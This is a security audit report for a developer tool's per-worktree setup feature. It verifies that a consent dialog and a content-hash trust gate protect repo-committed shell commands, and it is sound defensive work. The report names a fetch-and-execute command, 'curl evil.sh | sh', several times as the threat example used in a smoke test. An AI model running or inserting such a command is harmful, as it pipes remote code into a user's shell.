---
phase: 06-per-worktree-setup-via-arduis-toml
threats_open: 0
threats_closed: 14
threats_total: 14
asvs_level: 2
audited: 2026-06-13
verdict: SECURED
---

# Phase 6 Security Audit — Per-Worktree Setup via `.arduis.toml`

**Verdict: SECURED — 14/14 threats closed (11 mitigate, 3 accept).**

This phase's whole point is running repo-committed commands. The central control is the
**trust gate**: informed consent (exact commands shown) plus a content-hash trust grant
(direnv-allow model). I scrutinized that gate hard against the implemented code, ran the unit
suite (34/34 Phase-6 tests), and ran the headless broadway smoke (7/7) which captures the real
bytes fed to the VTE terminals under a sandbox HOME. Every declared mitigation is present and
verified.

---

## The Trust Boundary — explicit, designed, accepted

`.arduis.toml` is **committed in the repo**, so its `[setup].commands` are **arbitrary code the
repo author chose**. When the user adds a worktree, arduis can feed those commands into the
worktree's login shell. This is, by design, a **supply-chain remote-code-execution surface**.

**The control is NOT sandboxing.** arduis runs the commands verbatim in the user's real
`zsh -l -i` — that is the explicit intent (a setup script must be able to `npm install`, touch
files, resolve version-manager shims). The control is a two-part gate:

1. **Informed consent** — before any byte reaches a PTY, the user sees a consolidated
   `Adw.AlertDialog` listing the **exact, verbatim commands** grouped per repo
   (`_present_setup_trust`, window.py:2265-2297). No elision, no `shlex`-collapse, no hidden
   commands. The disclosure IS the security checkpoint.
2. **Content-hash trust** — a trust grant is bound to the **content** of the command list
   (`trust.setup_hash` = sha256 over the ordered, newline-joined commands), keyed by the repo's
   realpath. A `git pull` that swaps the trusted setup for `curl evil | sh` produces a new hash,
   so `is_trusted` returns False and the user is re-prompted (verified live in the smoke).

This is an **accepted, designed risk** (T-06-05, T-06-11): arduis cannot and does not try to
prevent a user from approving hostile commands. It guarantees the user is *shown* exactly what
will run and is *re-asked* whenever the content changes. Both controls are real and verified
below.

---

## Threat Verification (all 14)

### Plan 06-01 — domain primitives (`repoconfig.py`, `trust.py`)

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-06-01 | Tampering / EoP | mitigate | CLOSED | `setup_hash` produces the content-bound key; module never runs commands — only parses + hashes. No auto-run path exists in `repoconfig.py`/`trust.py`. Verified by inspection (both files are pure stdlib, no exec/subprocess). |
| T-06-02 | Tampering | mitigate | CLOSED | `trust.setup_hash` hashes `"\n".join(commands)` (trust.py:38) — any edit/add/remove/reorder changes the digest. 19 trust unit tests pin stability + change-on-mutation. Smoke `changed_setup_reprompts` proves a `curl evil.sh \| sh` swap → `is_trusted` False. |
| T-06-03 | Tampering | mitigate | CLOSED | **FAIL-CLOSED confirmed.** `load_trusted` (trust.py:41-56) returns `{}` on `OSError`/`TOMLDecodeError`/`[trusted]`-not-a-dict and drops non-str values; `is_trusted` (trust.py:59-65) is `load_trusted(...).get(repo_id) == hash`. Corrupt/garbage/missing list → `{}` → False → re-prompt everything. Never fail-open. `record_trust` (trust.py:84-110) writes via tmp + `os.replace` (atomic, swallow OSError) — a torn write cannot corrupt the record. |
| T-06-04 | DoS | mitigate | CLOSED | `load_repo_setup` (repoconfig.py:31-52) swallows `OSError`/`TOMLDecodeError` → `RepoSetup([])`. 15 repoconfig unit tests include garbage-TOML/wrong-type → no exception escapes. |
| T-06-05 | Tampering (cd-guard / feed injection) | **accept** | CLOSED | **Dir-guard injection-safe confirmed.** `setup_feed_bytes` (repoconfig.py:73) single-quotes the cd target with POSIX escaping: `"'" + worktree_dir.replace("'", "'\\''") + "'"`. A path containing `'`, space, `;`, `&` cannot break out of the single-quote context. The path is arduis-derived (a resolved worktree dir), never user-typed. The commands themselves are fed RAW (verbatim user intent) — that is the accepted design (the trust gate, not escaping, is the control for the command bodies). |

### Plan 06-02 — composition wiring (`window.py`)

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-06-06 | EoP / Tampering (RCE on add) | mitigate | CLOSED | No feed without a trust check. `_run_repo_setups` (window.py:2223-2245): untrusted `(repo_realpath, hash)` always routes to `_present_setup_trust`; only the `"trust"` response branch (window.py:2289-2294) calls `record_trust` + `_feed_repo_setup`. Nothing runs silently unless a prior **exact-content** trust exists. |
| T-06-07 | Tampering (`git pull` swap) | mitigate | CLOSED | Gate keys on `trust.setup_hash(setup.commands)` (window.py:2238); changed content → new hash → `is_trusted` False → `_present_setup_trust`. Same evidence as T-06-02 at the UI layer. |
| T-06-08 | Tampering (feed into agent TUI) | mitigate | CLOSED | `_feed_repo_setup` (window.py:2247-2263) targets `self._term_by_sid.get(f"{task.task_id}:t1")` — the **shell** terminal, hardcoded. Never `:t0` (agent). Smoke `agent_terminal_never_fed` asserts the agent terminal receives no setup payload. |
| T-06-09 | DoS (garbage/feed-error crashes create) | mitigate | CLOSED | `_run_repo_setups` skips repos with empty commands (the no-op path); `_feed_repo_setup` None-checks the terminal AND wraps `feed_child` in `try/except Exception: pass` (window.py:2258-2263). Nothing in the setup path can raise into the create chain. |
| T-06-10 | Repudiation / Tampering (skip→trust, forged trust) | mitigate | CLOSED | `_on_response` (window.py:2289-2294): if `response != "trust"` it returns immediately — persists NOTHING, feeds nothing (re-prompt next create). Trust is written ONLY inside the `"trust"` branch via atomic `record_trust`. |
| T-06-11 | Info Disclosure (setup exfiltrates secrets) | **accept** | CLOSED | Out of scope to prevent user-approved commands; arduis injects/stores NO secrets (project scope boundary). The verbatim-command dialog IS the user's checkpoint — confirmed it shows the exact commands (window.py:2274-2281, no elision). |

### Plan 06-03 — acceptance smoke (`tests/smoke/test_setup_feed_smoke.py`)

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-06-12 | Tampering (smoke mutates real trust list/repos) | mitigate | CLOSED | Smoke sets `os.environ["HOME"]` to a tmp sandbox before constructing the window; records the real `~/.config/arduis/trusted_setups.toml` mtime before and asserts unchanged after (`real_trust_list_untouched` PASS). Fixture repo lives entirely under the sandbox. |
| T-06-13 | DoS (leaked broadwayd / process groups) | mitigate | CLOSED | `finally` block (smoke:143-149): `shutil.rmtree(sandbox)` + `os.kill(bpid, 15)`. SKIPs cleanly (exit 0) if `gtk4-broadwayd` absent. |
| T-06-14 | Spoofing (smoke "passes" without proving the feed) | mitigate | CLOSED | Recorders wrap each terminal's `feed_child` (smoke:97-100) and capture real bytes; `trusted_feeds_shell_t1` asserts the exact `cd '<wt>' && … npm install` payload reached t1 AND the agent terminal got nothing. 7/7 PASS on this run. |

---

## Additional verification against the 6 key security questions

1. **FAIL-CLOSED execution** — CONFIRMED. Missing/corrupt trust list → `load_trusted` → `{}` →
   `is_trusted` False → re-prompt. Never auto-runs (T-06-03).
2. **CHANGED `.arduis.toml` re-prompts** — CONFIRMED. Hash is over the COMMANDS content, not the
   path. A `git pull` swapping `npm install` for `curl evil|sh` changes the hash → re-prompt
   (T-06-02/07; smoke proven with a literal `curl evil.sh | sh` swap).
3. **EXACT commands shown before execution** — CONFIRMED. `_present_setup_trust` joins the raw
   command strings verbatim into the dialog body; no hidden/elided/collapsed commands (T-06-11).
4. **Dir-guard injection-safe** — CONFIRMED. POSIX single-quoting with `'\''` escaping on the cd
   target; arduis-derived path, not user text (T-06-05).
5. **CREATE-only** — CONFIRMED. `_run_repo_setups` is called only from `_finalize_task_creation`
   (window.py:2186). `_resume_task` body contains neither `_run_repo_setups` nor
   `_finalize_task_creation` (grep-verified; smoke design note also asserts this structurally).
6. **Atomic + scoped trust write, no path traversal** — CONFIRMED. Write target is the FIXED
   `~/.config/arduis/trusted_setups.toml` (window.py:334-336, resolved once in `__init__`).
   `repo_id` is used only as a TOML key/value (quoted+escaped by `_esc`/`_serialize_trusted`),
   **never** as a filesystem path component of the write — so a hostile realpath cannot redirect
   the write. tmp + `os.replace` is atomic; OSError swallowed (and a failed write re-prompts
   anyway via fail-closed read).

---

## Accepted Risks Log

| ID | Risk | Why accepted | Compensating control |
|----|------|--------------|----------------------|
| T-06-05 | Repo-authored `[setup]` commands are arbitrary shell code run verbatim in the user's login shell | This is the feature's explicit purpose; sandboxing would break version-manager shims, file ops, installs. Command bodies are intentionally raw. | Informed-consent dialog shows exact commands + content-hash trust gate (re-prompt on change). cd TARGET is single-quote-escaped; path is arduis-derived. |
| T-06-11 | An approved setup command can read/exfiltrate local secrets | arduis cannot police what user-approved commands do; arduis itself stores/injects no secrets (scope boundary). | The verbatim-command dialog is the user's pre-execution checkpoint. |

---

## Unregistered Flags

None. No `## Threat Flags` section was present in any of the three Phase-6 SUMMARY files; the
executor reported no new attack surface beyond the declared register.

---

## Evidence Summary

- Unit: `tests/test_repoconfig.py` + `tests/test_trust.py` → 34 passed (15 + 19).
- GTK-free discipline: `grep -c "import gi\|from gi"` = 0 for both `repoconfig.py` and `trust.py`.
- Headless composition smoke: `tests/smoke/test_setup_feed_smoke.py` → `SMOKE_RESULT PASS (7/7)`
  under a sandbox HOME; real trust list untouched.
- Implementation files were NOT modified by this audit (read-only).

**SECURITY.md:** `/home/thallysrc/Projects/arduis/.planning/phases/06-per-worktree-setup-via-arduis-toml/06-SECURITY.md`
